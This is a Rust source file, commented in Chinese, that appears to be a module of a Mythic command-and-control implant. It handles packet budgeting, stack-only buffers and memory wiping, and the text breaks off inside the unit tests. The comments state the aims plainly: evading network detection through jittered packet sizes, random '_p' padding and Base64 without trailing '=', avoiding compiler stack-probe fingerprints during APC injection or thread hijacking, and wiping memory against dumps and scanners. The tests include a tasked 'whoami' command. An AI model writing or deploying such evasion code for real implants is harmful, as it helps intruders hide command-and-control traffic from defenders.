// 尚未引入多线程.还是通过mythic的状态机已经实现了多线程?

// 文件流式分片传输与断点续传状态机已在独立模块 `crate::file_transfer` 中实现 (严格遵循 Mythic 4.0 Offset 规范与 zero-heap 内存契约)

//! # 4KB/16KB/64KB 栈缓冲与流式切片内存管理契约 (Zero-Heap Stack Memory & Budget Primitives)
//!
//! ## 架构核心哲学与 Windows 10/11 规避对抗 (OPSEC)
//!
//! 1. **Caller-Provided Buffer（调用者提供外包缓冲区）**：
//!    - 将 4KB 缓冲区的控制权上移至调用者，底层纯计算叶子函数（如 `seal_message`）仅接收 `&mut [u8]` 切片（胖指针仅 16 字节），栈帧严格控制在 64 字节以内。
//!    - 内存解耦：调用者可自由决定将 4KB 缓冲区放置于当前栈帧、静态数据段（`.data`/`.bss`）、专用私有堆（Private Heap）或会话状态机中。
//! 2. **消除双重缓冲与内存开销减半**：
//!    - 杜绝“网络层准备 4KB + 加密函数内部局部数组 4KB = 8KB 栈深度”的冗余，实现全链路 In-place（原地）组装与转换。
//! 3. **规避 MSVC 栈探针 (`__chkstk`) 与 Guard Page 异常**：
//!    - 在 Windows x64 ABI 下，当函数局部变量超过 4096 字节（1 个页面）时，编译器会强制插入 `__chkstk` 探针符号以触碰 `PAGE_GUARD` 保护页，产生显著静态指纹。
//!    - 在深调用栈、APC 注入、Thread Hijacking 或 Stack Spoofing（栈伪造）场景下，宿主线程剩余可用栈极浅（可能仅有数 KB），轻量叶子栈帧可杜绝爆栈崩溃。
//! 4. **严格 3 字节对齐无填充 Base64 法则**：
//!    - 磁盘/管道原始数据单次读取上限 (`MAX_RAW_READ`) 严格向下对齐到 3 字节倍数，保证应用层内层 Base64 绝无尾部 `=` 或 `==` 填充字符，彻底消除微观流量指纹。
//! 5. **网络发包切片化与双层 Jitter 混淆**：
//!    - 栈缓冲区保上限 (`WIRE_SIZE`)，实际网络发包通过 `encode_to_slice` 仅传递有效切片；配合 `jittered_raw_read` 与 JSON 动态伪装字段 `_p`，破坏 NDR 基于固定包长的统计分析。
//! 6. **硬件级内存擦除 (Hardware Volatile Zeroization)**：
//!    - 通过 `core::ptr::write_volatile` 进行物理洗白，阻止 LLVM 作为 Dead Code 进行死码消除（Dead Code Elimination），等价于 Windows 原生 `SecureZeroMemory`，防御 Process Minidump、内存扫描与 Heap Remanence。

extern crate alloc;

use alloc::string::String;
use base64::prelude::*;
use core::mem::MaybeUninit;
use serde::{Deserialize, Serialize};

// ==========================================
// 1. 协议物理核心常量 (Protocol Physical Constants)
// ==========================================

/// Agent 唯一识别符 UUID 长度 (36 字节)
pub const UUID_LEN: usize = 36;

/// 密码学对称加密初始向量 IV 长度 (16 字节)
pub const IV_LEN: usize = 16;

/// HMAC-SHA256 完整性校验签名 Tag 长度 (32 字节)
pub const HMAC_LEN: usize = 32;

/// AES 块分组长度 (16 字节)
pub const AES_BLOCK_SIZE: usize = 16;

/// PKCS#7 最坏填充开销 (16 字节)
pub const PKCS7_WORST_PADDING: usize = 16;

/// 协议物理帧头部与防伪尾部固定开销 (UUID 36 + IV 16 + HMAC 32 = 84 字节)
pub const PROTOCOL_HEADER_LEN: usize = UUID_LEN + IV_LEN + HMAC_LEN;

// ==========================================
// 2. 参数化协议预算模板 (PacketBudget Template)
// ==========================================

/// 协议缓冲区与切片预算计算器
///
/// 利用 Rust 的 `const generics` 在编译期完成全套切片公式推导，零运行期开销。
///
/// * `WIRE_SIZE`: 网络出网目标报文总容量 (如 4KB: 4096, 16KB: 16384, 64KB: 65536)
/// * `JSON_OVERHEAD`: 应用层 JSON 骨架开销预估 (默认 150 字节)
pub struct PacketBudget<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize = 150>;

impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE, JSON_OVERHEAD> {
    // ----------------- 编译期内部静态断言 -----------------
    // 私有常量，在 MAX_RAW_LEN 初始化时强制求值，确保参数非法时立刻在编译期拦截
    const _SANITY_CHECK: () = {
        // assert!在编译期求值(cargo build期),如果断言条件为 true,继续向下执行,且经过编译器优化不会留下任何痕迹.如果断言为false,控制台打印panic信息,并打断编译,不会产出二进制文件,同样不会留下任何信息.
        assert!(WIRE_SIZE % 4 == 0, "WIRE_SIZE 必须能被 4 整除以满足 Base64 规范");
        assert!(
            WIRE_SIZE >= (PROTOCOL_HEADER_LEN + AES_BLOCK_SIZE + PKCS7_WORST_PADDING) * 4 / 3,
            "WIRE_SIZE 过小，无法容纳协议头与最小密文"
        );
        //  Base64 解码后二进制帧的物理总容量
        let raw_len = (WIRE_SIZE / 4) * 3;
        // 去掉mythic协议头,且满足aes16字节对齐的大小
        // saturating_sub饱和减法：如果减法结果小于 0，结果为0,避免整数溢出.
        let cipher_len = (raw_len.saturating_sub(PROTOCOL_HEADER_LEN) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
        // 当前缓冲区规格下,第一层明文JSON 数据的【物理上限容量
        let plaintext_len = cipher_len.saturating_sub(PKCS7_WORST_PADDING);
        assert!(plaintext_len > JSON_OVERHEAD, "明文容量不足以容纳 JSON 骨架开销");
    };

    // ----------------- 公共导出常量 -----------------
    /// 网络 Base64 缓冲区上限 (等于目标出网包预算)
    pub const MAX_B64_LEN: usize = WIRE_SIZE;

    /// 二进制物理帧暂存区上限 (Base64 解码后容量: WIRE_SIZE * 3 / 4)
    pub const MAX_RAW_LEN: usize = {
        let () = Self::_SANITY_CHECK;
        (WIRE_SIZE / 4) * 3
    };

    /// 密文区(base64解码后) 16 字节对齐的最大值 (采用 saturating_sub 防溢出)
    pub const MAX_CIPHERTEXT_LEN: usize =
        (Self::MAX_RAW_LEN.saturating_sub(PROTOCOL_HEADER_LEN) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;

    /// 第一层明文 JSON 的物理容量上限 (扣除 16B PKCS#7 保证加密后密文不溢出)
    pub const MAX_PLAINTEXT_LEN: usize =
        Self::MAX_CIPHERTEXT_LEN.saturating_sub(PKCS7_WORST_PADDING);

    /// JSON 中留给 Base64 编码的 4B 对齐字符容量.解密后base64是4字节对齐的
    pub const B64_ALIGNED_CAPACITY: usize =
        (Self::MAX_PLAINTEXT_LEN.saturating_sub(JSON_OVERHEAD) / 4) * 4;

    /// 磁盘/管道原始数据单次读取上限 (Raw Read: 严格 3 字节对齐，内层 Base64 绝无 '=' 填充,避免被流量审计发现base64尾部频繁出现填充的特征)
    pub const MAX_RAW_READ: usize = (Self::B64_ALIGNED_CAPACITY / 4) * 3;
    
    // 以下是关于网络数据包抖动相关

    /// JSON 注入 `,"_p":""`字段: 所需的最小语法骨架字符开销.即json结构体中插入 ,"_p":"" 这些字符,也需要消耗物理空间.其对应的空间大小是8字节.这里是否考虑对齐?
    pub const PADDING_FIELD_OVERHEAD: usize = 8;

    /// 推荐的最大动态填充抖动上限 (避免轻量心跳在 64KB 规格下被无意义塞满)
    pub const DEFAULT_MAX_JITTER: usize = 256;

    // ----------------- 动态切片与 Jitter 算法 -----------------
    /// 动态获取读取下限（取最大容量的 70%，并向下保证 3 字节对齐）
    #[inline(always)]
    pub const fn min_raw_read() -> usize {
        let seventy_percent = (Self::MAX_RAW_READ * 7) / 10;
        (seventy_percent / 3) * 3
    }

    /// 用于大文件传输工况
    /// 在base64编码前,计算带抖动的单次读取容量（兼顾高吞吐与防固定包长指纹特征）.每次读取随机大小的数据,且该值不能太小(效率低),不能太大(不能超过MAX_RAW_READ上限),必须是3的倍数(base64的对齐要求,避免出现=/==的填充)
    /// 那么min_raw_read()代表最小值,MAX_RAW_READ代表最大值.
    /// 严格向下取整到 3 的倍数，消除内层 Base64 '=' 填充
    pub fn jittered_raw_read() -> usize {
        // 函数名应该全是小写,即使是const函数
        let min_read = Self::min_raw_read();
        let max_read = Self::MAX_RAW_READ;

        if min_read >= max_read {
            return max_read;
        }

        // 计算最小和最大值之间有多少可选择的的值.最大和最小相减后,需要加1才是可用的区间.(如 [3-5],有3,4,5可用,但5-3=2)
        let span = max_read - min_read + 1;
        // 取余数.该余数代表循环之后,从起点min_read往前的偏移,且.该余数加上基准值min_read后,永不会超过max_read
        let pick = min_read + ((rand::random::<u32>() as usize) % span);
        (pick / 3) * 3
    }

    /// 用于心跳包等短指令工况
    /// 动态计算当前 Payload 还允许塞入多少随机 Padding 字符 (具备自适应熔断能力)
    ///
    /// * `raw_json_len`: 未注入 padding 字段前的原始 JSON 字符串长度
    /// * `max_jitter`: 本次抖动的最大边界建议值 (传 None 时使用 DEFAULT_MAX_JITTER(256)；传 Some(0) 显式禁用,传 Some(64)：表示建议这次最多抖动 64 字节)
    pub fn get_random_padding_len(raw_json_len: usize, max_jitter: Option<usize>) -> usize {
        // 1. 扣除 JSON 语法开销，计算物理剩余可用容量
        let avail_space = Self::MAX_PLAINTEXT_LEN
            .saturating_sub(raw_json_len)
            .saturating_sub(Self::PADDING_FIELD_OVERHEAD);

        // 2. 提取上限：若显式传 Some(0)，代表调用者要求关闭抖动，直接熔断返回 0
        let cap = match max_jitter {
            Some(0) => return 0,
            Some(limit) => limit,
            None => Self::DEFAULT_MAX_JITTER,
        };

        // 3. 计算本轮有效上限 (取物理剩余可用容量与调用者配额的最小值)
        let upper_bound = avail_space.min(cap);

        // 4. 混淆下限为 8 字节；若可用空间或调用者配额不足 8 字节，则放弃混淆返回 0.因为aes是16字节对齐,小于8字节,并不能能起到打乱密文块长度的作用.因此放弃
        if upper_bound < 8 {
            return 0;
        }

        8 + ((rand::random::<u32>() as usize) % (upper_bound - 8 + 1))
    }

    /// 给报文注入内容进行填充的具体方式.【100% 零堆分配】高效生成轻量随机 ASCII 伪装切片
    ///
    /// * `out_buf`: 调用者在栈上准备的可变字节缓冲区切片
    /// * `len`: 本轮所需填充的随机字符长度
    #[inline]
    pub fn generate_padding_slice<'a>(
        out_buf: &'a mut [u8],
        len: usize,
    ) -> Option<&'a str> {
        if len == 0 || len > out_buf.len() {
            return None;
        }

        const CHARSET: &[u8] =
            b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        // 直接在传入的栈切片上原地写入随机 ASCII 字符.写入头部(out_buf[..len])
        for byte in out_buf[..len].iter_mut() {
            // Rust 1.94 现代写法.rand::random::<u8>()随机产生一个u8类型的正整数(0-255).对该正整数取CHARSET.len (62)的余数.产生的数一定落在[0-61]之间,之后将对应的 CHARSET中字符插入头部.
            let idx = (rand::random::<u8>() as usize) % CHARSET.len();
            *byte = CHARSET[idx];
        }

        // 在头部插入随机ascii字符,构建完整的填充后的字符串
        // CHARSET 均为合法 ASCII，此转换 100% 安全且没有任何堆分配与内存拷贝.通过引用的方式写入源字符串的头部,零内存拷贝,零堆分配.
        core::str::from_utf8(&out_buf[..len]).ok()
    }

    /// 高效生成轻量随机 ASCII 伪装字符串 (保留堆分配版本供兼容/快速测试使用)
    /// 采用了堆分配,一般情况下不应该用
    #[inline]
    pub fn generate_padding(len: usize) -> Option<String> {
        if len == 0 {
            return None;
        }
        let mut buf = [0u8; 256];
        if len <= buf.len() {
            Self::generate_padding_slice(&mut buf, len).map(String::from)
        } else {
            const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let mut s = String::with_capacity(len);
            for _ in 0..len {
                let idx = (rand::random::<u8>() as usize) % CHARSET.len();
                s.push(CHARSET[idx] as char);
            }
            Some(s)
        }
    }
}

// ==========================================
// 3. 常用工程规格预设 (Preset Budget Aliases)
// ==========================================

/// 常规心跳与轻量命令规格 (4KB 出网: 4096B Wire, 3072B Raw, 2960B Plaintext, 2106B Raw Read)
pub type Budget4K = PacketBudget<{ 4 * 1024 }>;

/// 中型回显与枚举规格 (16KB 出网: 16384B Wire, 12288B Raw, 12176B Plaintext, 9018B Raw Read)
pub type Budget16K = PacketBudget<{ 16 * 1024 }>;

/// 大文件传输与内存 Dump 分片规格 (64KB 出网: 65536B Wire, 49152B Raw, 49040B Plaintext, 36666B Raw Read)
pub type Budget64K = PacketBudget<{ 64 * 1024 }>;

// ==========================================
// 4. 全局向后兼容常量 (Backward Compatibility Constants)
// ==========================================

/// 二进制数据包上限 (3072 字节)
pub const MAX_RAW_LEN: usize = Budget4K::MAX_RAW_LEN;

/// 单切片最大明文容量 (2960 字节)
pub const MAX_PLAINTEXT_LEN: usize = Budget4K::MAX_PLAINTEXT_LEN;

/// Base64 编码文本输出缓冲区标准上限 (4096 字节 = 4KB)
pub const MAX_B64_LEN: usize = Budget4K::MAX_B64_LEN;

/// 协议固定安全与路由头开销 (UUID 36 + IV 16 + HMAC 32 + PKCS#7 16 = 100 字节)
pub const PROTOCOL_OVERHEAD: usize = PROTOCOL_HEADER_LEN + PKCS7_WORST_PADDING;

// ==========================================
// 5. 动态分片编码与多桶调度 (Dynamic Slice Encoding & Bucket Morphing)
// ==========================================

/// 将密文帧编码至调用者提供的栈缓冲区，并返回零拷贝有效切片引用
///
/// 核心准则：栈缓冲区保上限，网络发包切片化。实际发送时严禁发送整个定长缓冲区，必须只发送实际编码后的动态长度切片。
///
/// * `input`: 待编码的二进制数据切片
/// * `wire_buf`: 调用者提供的定长栈/静态输出缓冲区 (例如 4096 字节)
/// * 返回: 写入有效长度的字符切片引用 (`&'a [u8]`)，100% 零堆分配、零内存复制
#[inline]
pub fn encode_to_slice<'a>(
    input: &[u8],
    wire_buf: &'a mut [u8],
) -> Result<&'a [u8], base64::EncodeSliceError> {
    let written = BASE64_STANDARD.encode_slice(input, wire_buf)?;
    Ok(&wire_buf[..written])
}
 
/// 传输桶档位 (Multi-Bucket Morphing)
#[derive(PartialEq, Eq, Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub enum DynamicBudget {
    Small,
    Medium,
    Large,
}

impl DynamicBudget {
    /// 根据待发载荷大小和隐蔽策略，动态选择规格并返回带 Jitter 的读取尺寸
    pub fn select_jittered_read(required_raw_len: usize) -> usize {
        if required_raw_len <= Budget4K::MAX_RAW_READ {
            Budget4K::jittered_raw_read()
        } else if required_raw_len <= Budget16K::MAX_RAW_READ {
            Budget16K::jittered_raw_read()
        } else {
            Budget64K::jittered_raw_read()
        }
    }

    /// 获取当前档位的目标网络出网包容量
    #[inline(always)]
    pub const fn wire_size(self) -> usize {
        match self {
            DynamicBudget::Small => Budget4K::MAX_B64_LEN,
            DynamicBudget::Medium => Budget16K::MAX_B64_LEN,
            DynamicBudget::Large => Budget64K::MAX_B64_LEN,
        }
    }
}

// ==========================================
// 6. 硬件级内存擦除工具 (Hardware Volatile Zeroization)
// ==========================================

/// 硬件级字节切片内存物理擦除
///
/// 使用 `write_volatile` 强制逐字节写入 0，阻止 LLVM/编译器将其作为无意义死码消除 (Dead Code Elimination)。
/// 功能等价于 Windows 原生 `RtlSecureZeroMemory` / `SecureZeroMemory`。
#[inline(always)]
pub fn zeroize_slice(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        unsafe {
            core::ptr::write_volatile(byte, 0);
        }
    }
}

/// 将 `alloc::string::String` 底层堆缓冲区原地洗白并刷零
///
/// 覆盖 String 的整个 capacity 堆缓冲区（不仅是 len），杜绝 spare capacity 泄露与 Heap Remanence。
/// 采用裸指针 volatile 写入，严格遵守 Rust 内存模型，杜绝未定义行为 (UB)。
#[inline(always)]
pub fn zeroize_string(s: &mut String) {
    let cap = s.capacity();
    if cap > 0 {
        let ptr = s.as_mut_ptr();
        for i in 0..cap {
            unsafe {
                core::ptr::write_volatile(ptr.add(i), 0);
            }
        }
    }
}

// ==========================================
// 7. 栈上固定容量向量 (Zero-Heap Stack Vector)
// ==========================================

/// 栈上固定容量向量 (Zero-Heap Stack Vector)
///
/// 彻底替换 `alloc::vec::Vec` 在零拷贝通信切片反序列化过程中的堆分配需求。
/// 内部数据完全存在于栈帧内存中，提供与 Vec 兼容的切片操作接口与 Serde Deserialize 实现。
pub struct StackVec<T, const N: usize> {
    data: [MaybeUninit<T>; N],
    len: usize,
}

impl<T, const N: usize> StackVec<T, N> {
    #[inline(always)]
    pub const fn new() -> Self {
        Self {
            data: unsafe { MaybeUninit::<[MaybeUninit<T>; N]>::uninit().assume_init() },
            len: 0,
        }
    }

    #[inline]
    pub fn push(&mut self, item: T) -> Result<(), T> {
        if self.len < N {
            self.data[self.len].write(item);
            self.len += 1;
            Ok(())
        } else {
            Err(item)
        }
    }

    #[inline(always)]
    pub fn len(&self) -> usize {
        self.len
    }

    #[inline(always)]
    pub fn is_empty(&self) -> bool {
        self.len == 0
    }

    #[inline(always)]
    pub fn capacity(&self) -> usize {
        N
    }

    #[inline]
    pub fn pop(&mut self) -> Option<T> {
        if self.len > 0 {
            self.len -= 1;
            unsafe {
                Some(self.data[self.len].assume_init_read())
            }
        } else {
            None
        }
    }

    #[inline]
    pub fn clear(&mut self) {
        while self.len > 0 {
            self.len -= 1;
            unsafe {
                core::ptr::drop_in_place(self.data[self.len].as_mut_ptr());
            }
        }
    }

    #[inline(always)]
    pub fn as_slice(&self) -> &[T] {
        unsafe {
            core::slice::from_raw_parts(self.data.as_ptr().cast::<T>(), self.len)
        }
    }

    #[inline(always)]
    pub fn as_mut_slice(&mut self) -> &mut [T] {
        unsafe {
            core::slice::from_raw_parts_mut(self.data.as_mut_ptr().cast::<T>(), self.len)
        }
    }
}

impl<T: Clone, const N: usize> Clone for StackVec<T, N> {
    fn clone(&self) -> Self {
        let mut new_vec = Self::new();
        for item in self.as_slice() {
            let _ = new_vec.push(item.clone());
        }
        new_vec
    }
}

impl<T: PartialEq, const N: usize> PartialEq for StackVec<T, N> {
    fn eq(&self, other: &Self) -> bool {
        self.as_slice() == other.as_slice()
    }
}

impl<T: Eq, const N: usize> Eq for StackVec<T, N> {}

impl<T: core::fmt::Debug, const N: usize> core::fmt::Debug for StackVec<T, N> {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        self.as_slice().fmt(f)
    }
}

impl<T, const N: usize> Drop for StackVec<T, N> {
    fn drop(&mut self) {
        self.clear();
    }
}

impl<T, const N: usize> Extend<T> for StackVec<T, N> {
    fn extend<I: IntoIterator<Item = T>>(&mut self, iter: I) {
        for item in iter {
            if self.push(item).is_err() {
                break;
            }
        }
    }
}

impl<T, const N: usize> Default for StackVec<T, N> {
    fn default() -> Self {
        Self::new()
    }
}

impl<T, const N: usize> core::ops::Deref for StackVec<T, N> {
    type Target = [T];
    #[inline(always)]
    fn deref(&self) -> &[T] {
        self.as_slice()
    }
}

impl<T, const N: usize> core::ops::DerefMut for StackVec<T, N> {
    #[inline(always)]
    fn deref_mut(&mut self) -> &mut [T] {
        self.as_mut_slice()
    }
}

impl<'a, T, const N: usize> IntoIterator for &'a StackVec<T, N> {
    type Item = &'a T;
    type IntoIter = core::slice::Iter<'a, T>;
    #[inline(always)]
    fn into_iter(self) -> Self::IntoIter {
        self.as_slice().iter()
    }
}

impl<'a, T, const N: usize> IntoIterator for &'a mut StackVec<T, N> {
    type Item = &'a mut T;
    type IntoIter = core::slice::IterMut<'a, T>;
    #[inline(always)]
    fn into_iter(self) -> Self::IntoIter {
        self.as_mut_slice().iter_mut()
    }
}

struct StackVecVisitor<T, const N: usize>(core::marker::PhantomData<fn() -> T>);

impl<'de, T: Deserialize<'de>, const N: usize> serde::de::Visitor<'de> for StackVecVisitor<T, N> {
    type Value = StackVec<T, N>;

    fn expecting(&self, formatter: &mut core::fmt::Formatter) -> core::fmt::Result {
        write!(formatter, "a sequence of up to {} elements", N)
    }

    fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>
    where
        A: serde::de::SeqAccess<'de>,
    {
        let mut vec = StackVec::new();
        while let Some(element) = seq.next_element()? {
            if vec.push(element).is_err() {
                while let Some(_) = seq.next_element::<serde::de::IgnoredAny>()? {}
                break;
            }
        }
        Ok(vec)
    }
}

impl<'de, T: Deserialize<'de>, const N: usize> Deserialize<'de> for StackVec<T, N> {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        deserializer.deserialize_seq(StackVecVisitor::<T, N>(core::marker::PhantomData))
    }
}

impl<T: Serialize, const N: usize> Serialize for StackVec<T, N> {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        self.as_slice().serialize(serializer)
    }
}

// ==========================================
// 8. 预先分配的大栈缓冲区 (Stack Arena Buffer)
// ==========================================

/// 预先分配的大栈缓冲区 (Stack Arena Buffer)
///
/// 从栈内存中划出连续字节切片，擦除时直接把 Offset 清零，杜绝所有堆分配与 Heap Remanence。
pub struct StackArena<const CAP: usize> {
    buf: [u8; CAP],
    offset: usize,
}

impl<const CAP: usize> StackArena<CAP> {
    #[inline(always)]
    pub const fn new() -> Self {
        Self {
            buf: [0u8; CAP],
            offset: 0,
        }
    }

    #[inline]
    pub fn alloc_slice(&mut self, len: usize) -> Option<&mut [u8]> {
        if self.offset.saturating_add(len) > CAP {
            return None;
        }
        let start = self.offset;
        let end = start + len;
        self.offset = end;
        Some(&mut self.buf[start..end])
    }

    #[inline(always)]
    pub fn used_slice(&self) -> &[u8] {
        &self.buf[..self.offset]
    }

    #[inline(always)]
    pub fn used_slice_mut(&mut self) -> &mut [u8] {
        let off = self.offset;
        &mut self.buf[..off]
    }

    #[inline(always)]
    pub fn offset(&self) -> usize {
        self.offset
    }

    #[inline(always)]
    pub fn remaining(&self) -> usize {
        CAP.saturating_sub(self.offset)
    }

    #[inline(always)]
    pub fn zeroize_and_reset(&mut self) {
        if self.offset > 0 {
            zeroize_slice(&mut self.buf[..self.offset]);
            self.offset = 0;
        }
    }
}

impl<const CAP: usize> Drop for StackArena<CAP> {
    fn drop(&mut self) {
        zeroize_slice(&mut self.buf);
        self.offset = 0;
    }
}

impl<const CAP: usize> Default for StackArena<CAP> {
    #[inline(always)]
    fn default() -> Self {
        Self::new()
    }
}

// ==========================================
// 9. 调用者外包工作区容器 (Caller-Provided 4KB Workspace)
// ==========================================

/// 4KB 原始二进制包外包类型
pub type RawBuffer = [u8; MAX_RAW_LEN];

/// 4KB Base64 传输包外包类型
pub type B64Buffer = [u8; MAX_B64_LEN];

/// 调用者统一 4KB 工作区容器 (Stack Workspace 4K)
///
/// 封装完整的 4KB 收发计算工作面，支持由调用者自由选择分配在栈上、全局静态区或堆中。
/// 离开作用域时自动触发物理清零，完全阻断内存敏感数据残留。
pub struct StackWorkspace4K {
    /// 3072 字节原始二进制组装/解密缓冲区
    pub raw_buf: RawBuffer,
    /// 4096 字节 Base64 编码输入/输出缓冲区
    pub b64_buf: B64Buffer,
}

impl StackWorkspace4K {
    #[inline(always)]
    pub const fn new() -> Self {
        Self {
            raw_buf: [0u8; MAX_RAW_LEN],
            b64_buf: [0u8; MAX_B64_LEN],
        }
    }

    /// 原地物理擦除两个缓冲区
    #[inline(always)]
    pub fn zeroize(&mut self) {
        zeroize_slice(&mut self.raw_buf);
        zeroize_slice(&mut self.b64_buf);
    }
}

impl Drop for StackWorkspace4K {
    fn drop(&mut self) {
        self.zeroize();
    }
}

impl Default for StackWorkspace4K {
    #[inline(always)]
    fn default() -> Self {
        Self::new()
    }
}

// ==========================================
// 10. 单元测试模块 (Unit Tests)
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_budget_constants() {
        assert_eq!(MAX_B64_LEN, 4096);
        assert_eq!(MAX_RAW_LEN, 3072);
        assert_eq!(MAX_PLAINTEXT_LEN, 2960);
        assert_eq!(PROTOCOL_OVERHEAD, 100);
        assert_eq!(MAX_RAW_LEN * 4 / 3, MAX_B64_LEN);
    }

    #[test]
    fn test_packet_budget_derivation() {
        // 4K 规格验证
        assert_eq!(Budget4K::MAX_B64_LEN, 4096);
        assert_eq!(Budget4K::MAX_RAW_LEN, 3072);
        assert_eq!(Budget4K::MAX_PLAINTEXT_LEN, 2960);
        assert_eq!(Budget4K::MAX_RAW_READ, 2106);
        assert_eq!(Budget4K::MAX_RAW_READ % 3, 0); // 3 字节严格对齐验证

        // 16K 规格验证
        assert_eq!(Budget16K::MAX_B64_LEN, 16384);
        assert_eq!(Budget16K::MAX_RAW_LEN, 12288);
        assert_eq!(Budget16K::MAX_PLAINTEXT_LEN, 12176);
        assert_eq!(Budget16K::MAX_RAW_READ, 9018);
        assert_eq!(Budget16K::MAX_RAW_READ % 3, 0);

        // 64K 规格验证
        assert_eq!(Budget64K::MAX_B64_LEN, 65536);
        assert_eq!(Budget64K::MAX_RAW_LEN, 49152);
        assert_eq!(Budget64K::MAX_PLAINTEXT_LEN, 49040);
        assert_eq!(Budget64K::MAX_RAW_READ, 36666);
        assert_eq!(Budget64K::MAX_RAW_READ % 3, 0);
    }

    #[test]
    fn test_jittered_raw_read() {
        for _ in 0..100 {
            let r4 = Budget4K::jittered_raw_read();
            assert!(r4 >= Budget4K::min_raw_read());
            assert!(r4 <= Budget4K::MAX_RAW_READ);
            assert_eq!(r4 % 3, 0, "4K 抖动读取必须为 3 的倍数以避免 Base64 '=' 填充");

            let r16 = Budget16K::jittered_raw_read();
            assert!(r16 >= Budget16K::min_raw_read());
            assert!(r16 <= Budget16K::MAX_RAW_READ);
            assert_eq!(r16 % 3, 0);
        }
    }

    #[test]
    fn test_encode_to_slice() {
        let raw = b"Wisconsin C2 Protocol Test";
        let mut wire_buf = [0u8; 128];
        let slice = encode_to_slice(raw, &mut wire_buf).expect("encode slice");
        assert_eq!(slice, b"V2lzY29uc2luIEMyIFByb3RvY29sIFRlc3Q=");
        assert_eq!(slice.len(), 36);
    }

    #[test]
    fn test_random_padding_and_generation() {
        let raw_json_len = 100;
        let pad_len = Budget4K::get_random_padding_len(raw_json_len, Some(64));
        assert!(pad_len >= 8);
        assert!(pad_len <= 64);

        // 1. 【100% 零堆分配】栈切片填充测试
        let mut pad_buf = [0u8; 128];
        let pad_slice = Budget4K::generate_padding_slice(&mut pad_buf, pad_len).expect("padding slice");
        assert_eq!(pad_slice.len(), pad_len);
        assert!(pad_slice.chars().all(|c| c.is_ascii_alphanumeric()));

        // 2. 边界与容量溢出安全防护
        let mut small_buf = [0u8; 4];
        assert!(Budget4K::generate_padding_slice(&mut small_buf, 8).is_none());
        assert!(Budget4K::generate_padding_slice(&mut small_buf, 0).is_none());

        // 3. 兼容版堆分配填充验证
        let padding_str = Budget4K::generate_padding(pad_len).expect("padding string");
        assert_eq!(padding_str.len(), pad_len);
        assert!(padding_str.chars().all(|c| c.is_ascii_alphanumeric()));

        // 4. 极端空间压迫下的自适应熔断测试
        let tight_len = Budget4K::MAX_PLAINTEXT_LEN - 5;
        assert_eq!(Budget4K::get_random_padding_len(tight_len, None), 0);

        // 5. 显式禁用抖动与不足 8 字节混淆阈值的熔断测试
        assert_eq!(Budget4K::get_random_padding_len(raw_json_len, Some(0)), 0);
        assert_eq!(Budget4K::get_random_padding_len(raw_json_len, Some(5)), 0);
    }

    #[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Debug)]
    struct MessagePayload<'a> {
        #[serde(borrow)]
        task_id: &'a str,
        #[serde(borrow)]
        cmd: &'a str,
        #[serde(borrow)]
        result: &'a str,
        #[serde(borrow, skip_serializing_if = "Option::is_none", default)]
        _p: Option<&'a str>,
    }

    impl<'a> MessagePayload<'a> {
        fn new(task_id: &'a str, cmd: &'a str, result: &'a str) -> Self {
            Self {
                task_id,
                cmd,
                result,
                _p: None,
            }
        }
        fn with_padding(mut self, padding: Option<&'a str>) -> Self {
            self._p = padding;
            self
        }
    }

    #[test]
    fn test_message_payload_zero_heap_serialization() {
        let mut pad_buf = [0u8; 64];
        let pad_len = 32;
        let pad_slice = Budget4K::generate_padding_slice(&mut pad_buf, pad_len);

        // 1. 无 padding 时的纯切片序列化 (字段被 skip_serializing_if 剔除)
        let payload_no_pad = MessagePayload::new("t-1", "whoami", "system");
        let json_no_pad = serde_json::to_string(&payload_no_pad).unwrap();
        assert!(!json_no_pad.contains("\"_p\""));

        // 2. 注入切片 padding 时的零堆分配序列化
        let payload_with_pad = payload_no_pad.with_padding(pad_slice);
        let json_with_pad = serde_json::to_string(&payload_with_pad).unwrap();
        assert!(json_with_pad.contains("\"_p\""));

        // 3. 反序列化零拷贝借用验证 (Zero-Copy Borrowing)
        let deserialized: MessagePayload = serde_json::from_str(&json_with_pad).unwrap();
        assert_eq!(deserialized.task_id, "t-1");
        assert_eq!(deserialized.cmd, "whoami");
        assert_eq!(deserialized.result, "system");
        assert_eq!(deserialized._p, pad_slice);
    }

    #[test]
    fn test_dynamic_budget_selection() {
        assert_eq!(DynamicBudget::Small.wire_size(), 4096);
        assert_eq!(DynamicBudget::Medium.wire_size(), 16384);
        assert_eq!(DynamicBudget::Large.wire_size(), 65536);

        let s1 = DynamicBudget::select_jittered_read(1000);
        assert!(s1 <= Budget4K::MAX_RAW_READ);
        assert_eq!(s1 % 3, 0);

        let s2 = DynamicBudget::select_jittered_read(5000);
        assert!(s2 <= Budget16K::MAX_RAW_READ);
        assert_eq!(s2 % 3, 0);
    }

    #[test]
    fn test_zeroize_slice() {
        let mut buf = [0xAAu8; 64];
        zeroize_slice(&mut buf);
        assert_eq!(buf, [0u8; 64]);
    }

    #[test]
    fn test_zeroize_string() {
        let mut s = String::from("secret-task-parameters");
        zeroize_string(&mut s);
        assert!(s.as_bytes().iter().all(|&b| b == 0));
    }

    #[test]
    fn test_stack_vec() {
        let mut vec: StackVec<u32, 4> = StackVec::new();
        assert!(vec.is_empty());
        assert_eq!(vec.capacity(), 4);

        assert!(vec.push(10).is_ok());
        assert!(vec.push(20).is_ok());
        assert_eq!(vec.len(), 2);
        assert_eq!(vec.as_slice(), &[10, 20]);

        assert_eq!(vec.pop(), Some(20));
        assert_eq!(vec.len(), 1);

